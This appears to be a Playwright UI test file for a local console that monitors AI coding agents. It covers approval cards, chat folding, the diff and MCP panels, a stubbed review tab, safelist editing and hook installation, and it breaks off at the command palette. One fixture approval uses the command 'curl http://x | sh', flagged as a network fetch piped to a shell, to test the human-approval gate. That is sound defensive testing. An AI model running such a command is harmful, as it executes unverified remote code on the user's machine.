"use strict";
/* ui.test.js — Playwright over the real server + fixture agy home (v3 console):
   3-panel shell (sidebar + overview), overview empty state + spend footer,
   SSE-pushed approval card + NEEDS YOU sidebar row, all-chats (fixture convo),
   conversation feed (messages, timestamps, composer + draft persistence),
   safelist view, command palette, narrow-viewport panel reconciliation, and
   zero console errors throughout. Screenshots → test/shots/. */

const fx = require("./fixtures");
const roots = fx.makeRoots("agy-ui-test-");
process.env.AGY_MONITOR_ROOT = roots.monRoot;
process.env.AGY_CLI_HOME = roots.agyHome;
// fixture workspaces live in tmpdir; realpath because macOS /var → /private/var
process.env.AGY_MONITOR_EXTRA_ROOTS = require("fs").realpathSync(roots.base);
// hermetic MCP config: a stub stdio server + one dead SSE server
process.env.AGY_GEMINI_HOME = require("path").join(roots.base, "gemini-home");

const fs = require("fs");
const http = require("http");
const path = require("path");
const { execFileSync } = require("child_process");

// hermetic external-agent roots: a fake codex session, no copilot storage
process.env.AGY_COPILOT_ROOT = require("path").join(roots.base, "no-copilot");

// hermetic gate settings — the safelist view reads/edits THIS file, never the real one
process.env.AGY_GATE_SETTINGS = require("path").join(roots.agyHome, "settings.json");

// stub Claude API so the REVIEW tab is testable hermetically
process.env.AGY_ANTHROPIC_PROVIDER = "anthropic";
process.env.ANTHROPIC_API_KEY = "test-key";
const claudeStub = http.createServer((req, res) => {
  let body = "";
  req.on("data", (d) => (body += d));
  req.on("end", () => {
    const text = JSON.stringify({
      verdict: "request_changes",
      summary: "One blocker in the modified file.",
      findings: [{ severity: "blocker", file: "hello.js", line: 2, title: "Broken constant", explanation: "22 breaks the invariant.", patch: "- const two = 22;\n+ const two = 2;", fix: "Restore two to 2." }],
    });
    res.writeHead(200, { "content-type": "application/json" });
    res.end(JSON.stringify({ model: "claude-opus-4-8", content: [{ type: "text", text }], usage: { input_tokens: 900, output_tokens: 150 } }));
  });
});

const { start } = require("../server");
const { chromium } = require("playwright");

const SHOTS = path.join(__dirname, "shots");

(async () => {
  const failures = [];
  fs.mkdirSync(SHOTS, { recursive: true });
  await new Promise((r) => claudeStub.listen(0, "127.0.0.1", r));
  process.env.ANTHROPIC_BASE_URL = "http://127.0.0.1:" + claudeStub.address().port;

  const mcpStub = fx.writeMcpStub(roots.base);
  // agy reads MCP from ~/.gemini/config/mcp_config.json, NOT settings.json
  fs.mkdirSync(path.join(process.env.AGY_GEMINI_HOME, "config"), { recursive: true });
  fs.writeFileSync(path.join(process.env.AGY_GEMINI_HOME, "config", "mcp_config.json"), JSON.stringify({
    mcpServers: {
      stub: { command: process.execPath, args: [mcpStub] },
      down: { serverUrl: "http://127.0.0.1:1/sse" },
    },
  }));
  const agyStub = fx.writeAgyStub(roots.base, roots.agyHome);
  process.env.AGY_GATE_AGY_BIN = agyStub; // the doctor's agy check must see the stub, not the host machine
  process.env.AGY_CODEX_ROOT = fx.writeCodexSession(roots.base).root;
  process.env.AGY_CLAUDE_ROOT = fx.writeClaudeSession(roots.base).root;

  // a real git workspace so the DIFF panel + @-file menu have content
  const ws = path.join(roots.base, "ws");
  fs.mkdirSync(ws, { recursive: true });
  const git = (...args) => execFileSync("git", ["-C", ws, ...args], { env: { ...process.env, GIT_AUTHOR_NAME: "t", GIT_AUTHOR_EMAIL: "t@t", GIT_COMMITTER_NAME: "t", GIT_COMMITTER_EMAIL: "t@t" } });
  git("init", "-q");
  fs.writeFileSync(path.join(ws, "hello.js"), "const one = 1;\nconst two = 2;\n");
  git("add", "-A"); git("commit", "-qm", "init");
  fs.writeFileSync(path.join(ws, "hello.js"), "const one = 1;\nconst two = 22; // changed\n");
  fs.writeFileSync(path.join(ws, "brand-new.txt"), "untracked line\n");

  fx.writeConversation(roots.agyHome, { workspace: ws });

  const s = await start({ port: 0, token: "", agyBin: agyStub });
  const base = `http://127.0.0.1:${s.port}`;
  const browser = await chromium.launch();
  const page = await browser.newPage({ viewport: { width: 1280, height: 800 } });
  const consoleErrors = [];
  // Google Fonts is the page's only external resource — a runner without internet
  // must not fail the zero-console-errors assertion over it
  page.on("console", (m) => { if (m.type() === "error" && !/fonts\.(googleapis|gstatic)\.com/.test(m.text())) consoleErrors.push(m.text()); });
  page.on("pageerror", (e) => consoleErrors.push(String(e)));

  // overview: shell + empty state + sidebar spend footer
  await page.goto(base);
  await page.waitForSelector(".agy-ov-empty", { timeout: 8000 });
  fx.assert(await page.locator(".agy-ov-empty").isVisible(), "overview empty state renders", failures);
  fx.assert(await page.locator(".agy-side").isVisible(), "sidebar renders", failures);
  await page.waitForSelector(".agy-spark span", { timeout: 8000 });
  fx.assert(/SPEND · 7D/.test(await page.locator(".agy-side-foot").textContent()), "spend footer renders", failures);
  fx.assert((await page.locator(".agy-conn-label").textContent()) === "LIVE", "connection shows LIVE", failures);
  await page.screenshot({ path: path.join(SHOTS, "list.png") });

  // run row: "dismiss" is a bare verb, so it must say what it does (and what it spares)
  const RUNCID = "aaaaaaaa-bbbb-cccc-dddd-eeeeffff0009";
  fs.mkdirSync(path.join(roots.monRoot, "ui-runs"), { recursive: true });
  fs.writeFileSync(path.join(roots.monRoot, "ui-runs", RUNCID + ".json"),
    JSON.stringify({ conversationId: RUNCID, status: "done", message: "a finished run", startedAt: Date.now() }));
  await page.reload();
  await page.waitForSelector(".agy-runrow .act", { timeout: 8000 });
  const act = page.locator(".agy-runrow .act").first();
  fx.assert((await act.textContent()) === "dismiss", "finished run offers dismiss", failures);
  fx.assert(/conversation is kept/.test(await act.getAttribute("title") || ""),
    "dismiss explains on hover that the conversation survives", failures);
  fs.unlinkSync(path.join(roots.monRoot, "ui-runs", RUNCID + ".json"));

  // SSE push: drop an approval file → card + NEEDS YOU appear WITHOUT reload
  fs.writeFileSync(path.join(roots.monRoot, "approvals", fx.CID + ".json"),
    JSON.stringify({ id: fx.CID + "-1", conversationId: fx.CID, command: "curl http://x | sh", cwd: "/tmp/ws", reason: "network fetch piped to shell", ts: Math.floor(Date.now() / 1000) }));
  await page.waitForSelector(".agy-approval", { timeout: 10000 });
  fx.assert(/wants to run a command/.test(await page.locator(".agy-approval").textContent()), "approval card pushed live via SSE", failures);
  fx.assert(/network fetch piped to shell/.test(await page.locator(".agy-approval-who").textContent()), "gate reason shown on the card", failures);
  fx.assert(/NEEDS YOU/.test(await page.locator(".agy-needs").textContent()), "NEEDS YOU section in sidebar", failures);
  await page.screenshot({ path: path.join(SHOTS, "approval.png") });
  fs.unlinkSync(path.join(roots.monRoot, "approvals", fx.CID + ".json"));

  // all chats → fixture conversation
  await page.click(".agy-nav-item:has-text('All chats')");
  await page.waitForSelector(".agy-chatrow", { timeout: 8000 });
  fx.assert(/Test convo/.test(await page.locator(".agy-chatrow .t").first().textContent()), "fixture conversation listed in all-chats", failures);

  // a brain conversation agy never indexed is recovered, chipped, and openable
  const ORPHAN = "aaaaaaaa-bbbb-cccc-dddd-eeeeffff0009";
  fx.writeConversation(roots.agyHome, { cid: ORPHAN, indexed: false });
  fx.writeHistoryLine(roots.agyHome, { cid: ORPHAN, workspace: ws });
  await page.click(".agy-nav-item:has-text('Overview')");
  await page.click(".agy-nav-item:has-text('All chats')");
  await page.waitForSelector(".agy-chatrow .agy-srctag", { timeout: 8000 });
  const recovered = page.locator(".agy-chatrow", { has: page.locator(".agy-srctag", { hasText: "RECOVERED" }) });
  fx.assert(await recovered.count() === 1, "unindexed conversation renders with a RECOVERED chip", failures);
  const indexedRow = page.locator(".agy-chatrow", { hasText: "Test convo" });
  fx.assert(await indexedRow.locator(".agy-srctag").count() === 0, "the indexed row carries no chip", failures);

  // LIVE chip: AGY_MONITOR_NO_PS=1 empties D.sessions, so drive it through D.runs
  fs.writeFileSync(path.join(roots.monRoot, "ui-runs", ORPHAN + ".json"),
    // our own pid: listUiRuns confirms a "running" record with process.kill(pid, 0)
    JSON.stringify({ conversationId: ORPHAN, workspace: ws, kind: "send", status: "running", startedAt: Date.now(), pid: process.pid }));
  await page.waitForSelector(".agy-srctag.live", { timeout: 12000 });
  fx.assert(/LIVE/.test(await recovered.locator(".agy-srctag.live").textContent()), "a running run marks its row LIVE", failures);
  fs.unlinkSync(path.join(roots.monRoot, "ui-runs", ORPHAN + ".json"));
  await page.waitForSelector(".agy-srctag.live", { state: "detached", timeout: 12000 });
  fx.assert(await page.locator(".agy-srctag.live").count() === 0, "the LIVE chip clears when the run ends", failures);

  // a git-commit helper driving `agy -p` folds into ONE collapsible group.
  // Seeded indexed-only and with distinct titles so the RECOVERED-chip and
  // "Test convo" locators above stay unambiguous.
  const COMMIT_PROMPT = "Write a concise Git commit message for the following changes. Follow Conventional Commits format if possible...";
  for (let i = 0; i < 6; i++) {
    fx.writeConversation(roots.agyHome, { cid: `bbbbbbbb-cccc-dddd-eeee-ffff0000000${i}`, workspace: ws, title: "commit run " + i, prompt: COMMIT_PROMPT });
  }
  await page.click(".agy-nav-item:has-text('Overview')");
  await page.click(".agy-nav-item:has-text('All chats')");
  const noiseHead = page.locator(".agy-chatgroup-head.clickable");
  await noiseHead.waitFor({ timeout: 8000 });
  fx.assert(/REPEATED PROMPT · 6 CHATS/.test(await noiseHead.textContent()), "repeated one-shot prompts fold into one group, counted", failures);
  fx.assert(/Write a concise Git commit message/.test(await noiseHead.textContent()), "the group is labelled with the shared prompt", failures);
  // by head TEXT, not by .clickable — while searching the head is not a control
  const noiseGroup = page.locator(".agy-chatgroup", { has: page.locator(".agy-chatgroup-head", { hasText: "REPEATED PROMPT" }) });
  fx.assert(await noiseGroup.locator(".agy-chatrow").count() === 0, "the group arrives collapsed — none of its rows are in the DOM", failures);
  fx.assert(await page.locator(".agy-chatrow", { hasText: "Test convo" }).count() === 1, "…and the hand-written chats are still visible above it", failures);
  await page.screenshot({ path: path.join(SHOTS, "allchats-folded.png") });

  // rows are built lazily on expand and only HIDDEN on re-collapse, so visibility
  // — not DOM presence — is what the toggle assertions have to look at
  const shownRows = (loc) => loc.locator(".agy-chatrow:visible").count();
  await noiseHead.click();
  await page.waitForFunction(() => document.querySelectorAll(".agy-chatgroup-head.clickable ~ .agy-cardlist .agy-chatrow").length === 6, null, { timeout: 8000 });
  fx.assert(await shownRows(noiseGroup) === 6, "clicking the group expands all 6 chats", failures);
  await noiseHead.click();
  fx.assert(await shownRows(noiseGroup) === 0, "…and clicking again folds it back", failures);

  // searching narrows the fold to matches and keeps the control usable
  await page.fill(".agy-search", "commit run 3");
  await page.waitForFunction(() => /1 MATCH/.test(document.querySelector(".agy-chatgroup-head.clickable")?.textContent || ""), null, { timeout: 8000 });
  fx.assert(/1 MATCH/.test(await noiseGroup.locator(".agy-chatgroup-head").textContent()), "the fold counts matches, not the whole cluster, while searching", failures);
  await noiseHead.click();
  await page.waitForFunction(() => document.querySelectorAll(".agy-chatrow:not([style*='none'])").length >= 1, null, { timeout: 8000 });
  fx.assert(await shownRows(noiseGroup) === 1, "…and the matching chat is one click away", failures);
  await noiseHead.click(); // back to folded, so the state below is unambiguous

  // full-text matches fold too — this section floods harder than the list above,
  // because a content query hits the identical prompt in every single run
  await page.fill(".agy-search", "Conventional Commits");
  await page.waitForSelector(".agy-sub-note:has-text('FOUND INSIDE')", { timeout: 12000 });
  const found = page.locator(".agy-chatgroup", { has: page.locator(".agy-chatgroup-head", { hasText: "REPEATED PROMPT" }) }).last();
  fx.assert(/FOUND INSIDE 6 MORE CONVERSATIONS/.test(await page.locator(".agy-sub-note").first().textContent()), "content search still reports the true total", failures);
  fx.assert(/REPEATED PROMPT · 6 MATCHES/.test(await found.locator(".agy-chatgroup-head").textContent()), "…but renders them as one folded group, not 6 rows", failures);
  fx.assert(await shownRows(found) === 0, "…collapsed, so the fold survives a content search", failures);
  await page.fill(".agy-search", "");
  await page.waitForSelector(".agy-chatgroup-head.clickable", { timeout: 8000 });
  fx.assert(await shownRows(noiseGroup) === 0, "the cluster is folded again once the search clears", failures);

  await recovered.click();
  await page.waitForSelector(".agy-msg-user", { timeout: 8000 });
  fx.assert(/hello agy/.test(await page.locator(".agy-msg-user").textContent()), "a recovered conversation opens with its transcript", failures);
  fx.assert(/hello agy/.test(await page.locator(".agy-htitle").textContent()), "…titled from its transcript, not 'conversation'", failures);

  // conversation feed: messages + timestamps + composer
  await page.click(".agy-nav-item:has-text('All chats')");
  await page.waitForSelector(".agy-chatrow", { timeout: 8000 });
  await indexedRow.click();
  await page.waitForSelector(".agy-msg-user", { timeout: 8000 });
  fx.assert(/hello agy/.test(await page.locator(".agy-msg-user").textContent()), "user message rendered", failures);
  fx.assert(/all good/.test(await page.locator(".agy-msg-agy").first().textContent()), "assistant markdown rendered", failures);
  fx.assert(await page.locator(".agy-msg-ts").count() >= 2, "message timestamps rendered", failures);
  fx.assert(await page.locator(".agy-ta").isVisible(), "composer available for a non-live conversation", failures);

  // workspace DIFF panel: branch, modified + untracked files, ±CTX
  await page.waitForSelector(".agy-fhead", { timeout: 8000 });
  fx.assert(/⎇/.test(await page.locator(".agy-ws-branch").textContent()), "branch chip in panel head", failures);
  fx.assert(/hello\.js/.test(await page.locator(".agy-ws-body").textContent()), "modified file listed in DIFF", failures);
  fx.assert(/brand-new\.txt/.test(await page.locator(".agy-ws-body").textContent()), "untracked file listed as add", failures);
  fx.assert(/const two = 22/.test(await page.locator(".agy-ws-body").textContent()), "added line rendered", failures);
  const ctxBefore = await page.locator(".agy-dline.ctx").count();
  await page.click(".agy-ws-tool:has-text('±CTX')");
  await page.waitForTimeout(200);
  const ctxAfter = await page.locator(".agy-dline.ctx").count();
  fx.assert(ctxAfter > ctxBefore, "±CTX reveals context lines", failures);
  await page.click(".agy-ws-tool:has-text('±CTX')");

  // slash menu: /to → menu with /tokens; Tab inserts; pill appears
  await page.fill(".agy-ta", "");
  await page.type(".agy-ta", "/to");
  await page.waitForSelector(".agy-menu", { timeout: 5000 });
  fx.assert(/\/tokens/.test(await page.locator(".agy-menu").textContent()), "slash menu lists /tokens", failures);
  await page.keyboard.press("Tab");
  fx.assert(/^\/tokens /.test(await page.inputValue(".agy-ta")), "Tab inserts the command", failures);
  await page.waitForSelector(".agy-cmdpill", { timeout: 5000 });
  fx.assert(/BUILT-IN/.test(await page.locator(".agy-cmdpill").textContent()), "active-command pill with source tag", failures);

  // @-file menu lists workspace files
  await page.fill(".agy-ta", "");
  await page.type(".agy-ta", "look at @hel");
  await page.waitForSelector(".agy-menu", { timeout: 5000 });
  fx.assert(/@hello\.js/.test(await page.locator(".agy-menu").textContent()), "@-menu lists workspace file", failures);
  await page.keyboard.press("Enter");
  fx.assert(/@hello\.js /.test(await page.inputValue(".agy-ta")), "Enter inserts the @file", failures);

  // draft persistence
  await page.fill(".agy-ta", "draft text here");
  await page.reload();
  await page.waitForSelector(".agy-ta", { timeout: 8000 });
  fx.assert((await page.inputValue(".agy-ta")) === "draft text here", "composer draft survives reload", failures);
  await page.screenshot({ path: path.join(SHOTS, "detail.png") });

  // MCP tab: stub stdio server connected with tools; dead SSE server errored
  await page.waitForSelector(".agy-mcp-chip", { timeout: 12000 });
  fx.assert(/1\/2 MCP/.test(await page.locator(".agy-mcp-chip").textContent()), "MCP head chip counts connected/total", failures);
  await page.click(".agy-mcp-chip");
  await page.waitForSelector(".agy-mcp-server", { timeout: 8000 });
  fx.assert(/echo_tool/.test(await page.locator(".agy-ws-body").textContent()), "stub server tools listed", failures);
  fx.assert(await page.locator(".agy-mcp-err").count() === 1, "dead server shows an error block", failures);
  // the description ellipsizes in this narrow panel — hover must expose it, click must wrap it open
  const toolRow = page.locator(".agy-mcp-tool").first();
  // waitForFunction re-queries the DOM each poll — immune to a renderPanel() tick
  // detaching a pre-resolved element mid-measurement (which read 0/0 → flake)
  const clipped = await page.waitForFunction(() => {
    const d = document.querySelector(".agy-mcp-tool .d");
    return !!d && d.scrollWidth > d.clientWidth;
  }, null, { timeout: 8000 }).then(() => true).catch(() => false);
  fx.assert(clipped, "a long tool description really is truncated in the panel", failures);
  // the backend used to cut descriptions to 140 chars, so the "full" text was never full
  fx.assert(/handling the request\.$/.test(await toolRow.getAttribute("title") || ""),
    "hover shows the description to its last word, not a 140-char stub", failures);
  const shutHeight = await toolRow.evaluate((n) => n.getBoundingClientRect().height);
  await toolRow.click();
  fx.assert(await toolRow.evaluate((n) => n.classList.contains("open")), "clicking a tool row expands its description", failures);
  fx.assert(await toolRow.evaluate((n) => n.getBoundingClientRect().height) > shutHeight,
    "expanding grows the row to show every line", failures);
  fx.assert(await toolRow.evaluate((n) => getComputedStyle(n.querySelector(".d")).whiteSpace) === "normal",
    "expanded description wraps instead of ellipsizing", failures);
  await page.screenshot({ path: path.join(SHOTS, "mcp-expanded.png") });
  await toolRow.click();
  fx.assert(!(await toolRow.evaluate((n) => n.classList.contains("open"))), "clicking again collapses it", failures);
  fx.assert(await page.locator(".agy-wtab:has-text('TURN')").getAttribute("title") !== null, "TURN tab explains its filter on hover", failures);
  await page.click(".agy-wtab:has-text('DIFF')");

  // ask card: paged question → pick → submit → folds to answered, no raw bubble
  const CID3 = "aaaaaaaa-bbbb-cccc-dddd-eeeeffff0003";
  fx.writeConversation(roots.agyHome, { cid: CID3, workspace: ws, title: "Ask convo", askTail: true });
  await page.goto(base + "/?convo=" + CID3);
  await page.waitForSelector(".agy-ask", { timeout: 8000 });
  fx.assert(/One quick question/.test(await page.locator(".agy-ask-head").textContent()), "ask card header intro", failures);
  fx.assert(/BACKOFF/.test(await page.locator(".agy-ask-eyebrow").first().textContent()), "question eyebrow from header", failures);
  await page.click(".agy-ask-opt:has-text('60s')");
  await page.waitForSelector(".agy-ask-next.ready", { timeout: 5000 });
  await page.screenshot({ path: path.join(SHOTS, "ask.png") });
  await page.click(".agy-ask-next.ready");
  await page.waitForSelector(".agy-ask.answered", { timeout: 8000 });
  fx.assert(/Answered — sent as your turn/.test(await page.locator(".agy-ask.answered").textContent()), "card folds to answered", failures);
  fx.assert(!/My answers:/.test(await page.locator(".agy-feed").textContent()), "no raw answers bubble in the feed", failures);

  // REVIEW tab: idle explainer → run → verdict banner + finding + header chip
  // (wide viewport → header out of compact mode, full button/chip labels)
  await page.setViewportSize({ width: 1680, height: 900 });
  await page.goto(base + "/?convo=" + fx.CID);
  await page.waitForSelector(".agy-wtab:has-text('REVIEW')", { timeout: 8000 });
  await page.click(".agy-wtab:has-text('REVIEW')");
  await page.waitForSelector(".agy-rv-idle", { timeout: 8000 });
  fx.assert(/One-shot Opus review/.test(await page.locator(".agy-rv-idle").textContent()), "review idle explainer renders", failures);
  await page.click(".agy-rv-idle button");
  await page.waitForSelector(".agy-rv-verdict", { timeout: 10000 });
  fx.assert(/REQUEST CHANGES/.test(await page.locator(".agy-rv-verdict").textContent()), "verdict banner renders", failures);
  fx.assert(/Broken constant/.test(await page.locator(".agy-rv-finding").textContent()), "finding card renders", failures);
  await page.waitForSelector(".agy-rv-chip", { timeout: 5000 });
  fx.assert(/1 BLOCKER/.test(await page.locator(".agy-rv-chip").textContent()), "header verdict chip shows blocker count", failures);
  await page.click(".agy-rv-finding .agy-btn", { timeout: 5000 });
  fx.assert(/Fix from Opus review/.test(await page.inputValue(".agy-ta")), "send-to-agy drafts the fix into the composer", failures);
  await page.screenshot({ path: path.join(SHOTS, "review.png") });
  await page.fill(".agy-ta", "");

  // fan-out no longer lives on the chat header — it routes to the new-chat page
  fx.assert(await page.locator(".agy-hbtn:has-text('fan out')").count() === 0, "no ⑃ fan out button on the chat header", failures);
  await page.keyboard.press(process.platform === "darwin" ? "Meta+k" : "Control+k");
  await page.waitForSelector(".agy-pal", { timeout: 5000 });
  await page.click(".agy-pal-row:has-text('Fan out a task')");
  await page.waitForSelector(".agy-nc-card", { timeout: 8000 });
  fx.assert((await page.locator(".agy-ncchip.on:has-text('best-of-N')").count()) === 1, "⑃ Fan out routes to the new-chat page with best-of-N preset", failures);
  // reset the persisted launch mode so the later new-chat assertions start from single-session
  await page.click(".agy-ncchip:has-text('single session')");

  // split view: two panes side-by-side, focus follows clicks, close returns to single
  const CID2 = "aaaaaaaa-bbbb-cccc-dddd-eeeeffff0002";
  fx.writeConversation(roots.agyHome, { cid: CID2, workspace: ws, title: "Second convo" });
  await page.goto(base + "/?split=" + fx.CID + "," + CID2);
  await page.waitForSelector(".agy-pane", { timeout: 8000 });
  fx.assert(await page.locator(".agy-pane").count() === 2, "two panes render", failures);
  await page.waitForSelector(".agy-pane .agy-msg-user", { timeout: 8000 });
  fx.assert(await page.locator(".agy-pane .agy-ta").count() === 2, "each pane has a composer", failures);
  fx.assert(/SPLIT VIEW/.test(await page.locator(".agy-crumb").textContent()), "split header crumb", failures);
  await page.locator(".agy-pane").nth(1).click();
  await page.waitForTimeout(200);
  fx.assert(await page.locator(".agy-pane").nth(1).evaluate((n) => n.classList.contains("focused")), "clicking a pane focuses it", failures);
  await page.screenshot({ path: path.join(SHOTS, "split.png") });
  await page.locator(".agy-pane .agy-x").first().click();
  await page.waitForTimeout(300);
  fx.assert(await page.locator(".agy-pane").count() === 0, "closing to one pane returns to single view", failures);
  fx.assert(/Second convo|conversation/.test(await page.locator(".agy-htitle").textContent()), "remaining conversation opens", failures);

  // ⑂ fork + ◗ btw entry points in the conversation view
  await page.goto(base + "/?convo=" + fx.CID);
  await page.waitForSelector(".agy-hbtn:has-text('fork')", { timeout: 8000 });
  fx.assert(await page.locator(".agy-hbtn:has-text('fork')").count() === 1, "header has a ⑂ fork button", failures);
  await page.waitForSelector(".agy-forkfrom", { timeout: 8000 });
  fx.assert((await page.locator(".agy-forkfrom").count()) >= 1, "user turns carry fork-from-here", failures);

  // btw: open the side chat, ask, get a stubbed side answer — no feed change
  const feedBefore = await page.locator(".agy-feed").textContent();
  await page.click(".agy-btwbtn");
  await page.waitForSelector(".agy-btw", { timeout: 5000 });
  fx.assert(/NOT IN CONTEXT/.test(await page.locator(".agy-btw-head").textContent()), "btw panel with NOT IN CONTEXT chip", failures);
  fx.assert(/writes nothing back/.test(await page.locator(".agy-btw-feed").textContent()), "btw explainer when empty", failures);
  await page.fill(".agy-btw-ta", "what did agy change?");
  await page.keyboard.press("Enter");
  await page.waitForSelector(".agy-btw-turn .who.side", { timeout: 10000 });
  fx.assert((await page.locator(".agy-btw-turn").count()) === 2, "btw thread has YOU + SIDE turns", failures);
  fx.assert((await page.locator(".agy-feed").textContent()) === feedBefore, "btw answer never enters the conversation feed", failures);
  await page.screenshot({ path: path.join(SHOTS, "btw.png") });
  await page.keyboard.press("Escape");
  await page.waitForSelector(".agy-btw", { state: "detached", timeout: 5000 });

  // external agents: sidebar section → read-only transcript → fork-to-agy bar
  await page.waitForSelector(".agy-ext-row", { timeout: 12000 });
  fx.assert(/OTHER AGENTS/.test(await page.locator(".agy-ext-sec").textContent()), "sidebar OTHER AGENTS section", failures);
  // several agents share this section, so every assertion targets ITS row rather than
  // whichever happens to be most recent
  fx.assert(await page.locator(".agy-ext-tag:has-text('CODEX')").count() === 1, "codex tag chip on the row", failures);
  await page.click(".agy-ext-row:has(.agy-ext-tag:has-text('CODEX'))");
  await page.waitForSelector(".agy-extbar", { timeout: 8000 });
  fx.assert(/CODEX · READ-ONLY/.test(await page.locator(".agy-extbar .tag").textContent()), "read-only bar replaces the composer", failures);
  fx.assert(await page.locator(".agy-ta").count() === 0, "no composer on an external transcript", failures);
  fx.assert(/flaky test/.test(await page.locator(".agy-msg-user").textContent()), "codex user turn rendered", failures);
  fx.assert(/CODEX/.test(await page.locator(".agy-role.ext").first().textContent()), "assistant turns labeled CODEX", failures);
  fx.assert(/read-only/.test(await page.locator(".agy-chip").textContent()), "header chip says read-only", failures);
  fx.assert(await page.locator(".agy-extbar-fork").count() === 1, "⑂ fork to agy action present", failures);
  await page.screenshot({ path: path.join(SHOTS, "external.png") });

  // claude code sessions sit alongside codex, and render their tool calls
  fx.assert(await page.locator(".agy-ext-tag:has-text('CLAUDE')").count() === 1, "claude code row in OTHER AGENTS", failures);
  // the reserve keeps codex visible even though the claude fixture is newer
  fx.assert(await page.locator(".agy-ext-tag:has-text('CODEX')").count() === 1, "codex is not crowded out by the newer claude session", failures);
  await page.click(".agy-ext-row:has(.agy-ext-tag:has-text('CLAUDE'))");
  await page.waitForSelector(".agy-extbar", { timeout: 8000 });
  fx.assert(/CLAUDE · READ-ONLY/.test(await page.locator(".agy-extbar .tag").textContent()), "claude read-only bar", failures);
  fx.assert(/export endpoint/i.test(await page.locator(".agy-msg-user").first().textContent()), "claude user turn rendered", failures);
  // the mid-turn message exists only as an attachment — the transcript is wrong without it
  fx.assert(/csv variant/.test(await page.locator(".agy-feed").textContent()), "queued mid-turn message rendered", failures);
  fx.assert(!/task-notification/.test(await page.locator(".agy-feed").textContent()), "machine turns stay out of the transcript", failures);
  const toolCard = page.locator(".agy-tool").first();
  fx.assert(await page.locator(".agy-tool").count() >= 1, "claude tool calls render as tool cards", failures);
  fx.assert(/Bash/.test(await toolCard.textContent()), "tool card names the tool", failures);
  await toolCard.click(); // expand to reveal the command + captured output
  fx.assert(/rg -n export/.test(await toolCard.textContent()), "tool card shows the command", failures);
  fx.assert(/app\.get/.test(await toolCard.textContent()), "tool card shows the tool's output", failures);
  await page.screenshot({ path: path.join(SHOTS, "external-claude.png") });

  // new chat: options card (LAUNCH/MODEL/PERMISSIONS/SAFETY) + adaptive button
  await page.goto(base + "/?new=");
  await page.waitForSelector(".agy-nc-card", { timeout: 8000 });
  fx.assert(/LAUNCH/.test(await page.locator(".agy-nc-card").textContent()), "LAUNCH row renders", failures);
  fx.assert(/gate commands · ON/.test(await page.locator(".agy-ncchip.green").textContent()), "safety gate defaults ON", failures);
  fx.assert(/Start chat/.test(await page.locator(".agy-nc-bar").textContent()), "single-session button label", failures);
  await page.click(".agy-ncchip:has-text('best-of-N')");
  fx.assert(/Launch 3 workers/.test(await page.locator(".agy-nc-bar").textContent()), "button adapts to ⑃ Launch N workers", failures);
  fx.assert(/WORKERS/.test(await page.locator(".agy-nc-card").textContent()), "WORKERS chips appear when fanning", failures);
  await page.click(".agy-ncchip:has-text('single session')");
  await page.screenshot({ path: path.join(SHOTS, "newchat.png") });

  // safelist view: current allow-list from settings.json + remove
  fs.writeFileSync(process.env.AGY_GATE_SETTINGS, JSON.stringify({
    model: "Gemini 3.1 Pro (High)",
    // the third entry is not a command(…) rule — agy's shell gate ignores it, and
    // the view must say so rather than render it as an equal peer
    permissions: { allow: ["command(git log)", "command(wc)", "mcp__playwright__browser_click"] },
  }));
  await page.goto(base + "/?safelist=1");
  await page.waitForSelector(".agy-htitle", { timeout: 8000 });
  fx.assert(/Safelist review/.test(await page.locator(".agy-htitle").textContent()), "safelist view mounts", failures);
  await page.waitForSelector(".agy-rule", { timeout: 8000 });
  fx.assert(/CURRENT SAFELIST — AUTO-APPROVED · 3/.test(await page.locator("[data-sec=rules]").textContent()), "current safelist section with count", failures);
  // assert on data-rule, not rendered text: the chip now shows the bare prefix
  fx.assert((await page.locator('.agy-rule[data-rule="command(git log)"]').count()) === 1, "allow rules listed from settings.json", failures);
  fx.assert((await page.locator('.agy-rule[data-rule="command(git log)"] .pat').textContent()).trim() === "git log", "chip shows the bare prefix, not command(...)", failures);
  fx.assert((await page.locator('.agy-rule.k-inert[data-rule="mcp__playwright__browser_click"] .pat').textContent()).trim() === "mcp__playwright__browser_click", "non-command rules render verbatim", failures);
  fx.assert(/not applied/i.test(await page.locator(".agy-rule.k-inert").textContent()), "non-command rules are marked not-applied", failures);
  await page.locator('.agy-rule[data-rule="command(wc)"] .x').click();
  await page.waitForFunction(() => document.querySelectorAll(".agy-rule").length === 2, null, { timeout: 8000 });
  const settingsNow = JSON.parse(fs.readFileSync(process.env.AGY_GATE_SETTINGS, "utf8"));
  fx.assert(!settingsNow.permissions.allow.includes("command(wc)"), "✕ removes the rule from settings.json", failures);
  fx.assert(settingsNow.permissions.allow.includes("command(git log)"), "other rules survive the demote", failures);
  await page.screenshot({ path: path.join(SHOTS, "safelist.png") });

  // onboarding: hook not installed in this world → banner on the overview,
  // setup view lists the checks, one-click install writes fixture hooks.json
  const hooksJson = path.join(process.env.AGY_GEMINI_HOME, "config", "hooks.json");
  fx.assert(!fs.existsSync(hooksJson) || !JSON.parse(fs.readFileSync(hooksJson, "utf8"))["agy-monitor"], "fixture world starts without our hook", failures);
  await page.goto(base);
  await page.waitForSelector(".agy-setup-banner", { timeout: 10000 });
  fx.assert(/live state is off/.test(await page.locator(".agy-setup-banner").textContent()), "hookless world shows the live-state banner", failures);
  await page.click(".agy-setup-banner .agy-btn");
  await page.waitForSelector(".agy-setup-list", { timeout: 8000 });
  fx.assert(/Setup/.test(await page.locator(".agy-htitle").textContent()), "setup view mounts", failures);
  fx.assert((await page.locator(".agy-setup-row").count()) >= 8, "setup lists the environment checks", failures);
  fx.assert((await page.locator(".agy-setup-row.ok:has-text('agy CLI')").count()) === 1, "stub agy check is green", failures);
  await page.screenshot({ path: path.join(SHOTS, "setup.png") });
  await page.click(".agy-setup-row.warn .agy-btn:has-text('Install hook')");
  await page.waitForFunction(() => {
    const rows = [...document.querySelectorAll(".agy-setup-row.ok")];
    return rows.some((r) => /live-state hook/.test(r.textContent));
  }, null, { timeout: 10000 });
  const installedCfg = JSON.parse(fs.readFileSync(hooksJson, "utf8"));
  fx.assert(!!installedCfg["agy-monitor"], "one-click install wrote the fixture hooks.json", failures);
  fx.assert(!!installedCfg["agy-monitor"].PreToolUse, "installed hook registers PreToolUse", failures);
  await page.goto(base);
  await page.waitForSelector(".agy-ov", { timeout: 8000 });
  await page.waitForTimeout(1600); // let the fresh boot's setup-status land
  fx.assert((await page.locator(".agy-setup-banner").count()) === 0, "banner clears once the hook is live", failures);

  // command palette opens + lists views; typed text stays in order (caret regression)
  await page.keyboard.press(process.platform === "darwin" ? "Meta+k" : "Control+k");
